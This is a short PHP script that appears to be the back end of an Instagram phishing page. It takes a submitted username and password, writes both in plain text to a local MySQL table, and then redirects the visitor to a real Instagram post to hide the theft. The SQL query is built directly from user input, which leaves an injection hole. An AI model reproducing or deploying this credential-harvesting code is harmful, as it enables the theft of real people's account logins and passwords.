<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {
    // collect value of input field
  
    $conn = new mysqli("localhost", "root", "","insta");
    $uid = $_POST['uid'];
    $pass = $_POST['pass'];
    $q = "INSERT INTO `data` (`pid`, `id`, `pass`, `dt`) VALUES ('', '$uid ', '$pass', current_timestamp());";
    mysqli_query($conn,$q);
    
    header("Location: https://www.instagram.com/p/CqCp5FRLRM_/?igshid=YTUzYTFiZDMwYg==");
  
      
  
     
  
  
  
  }
  ?>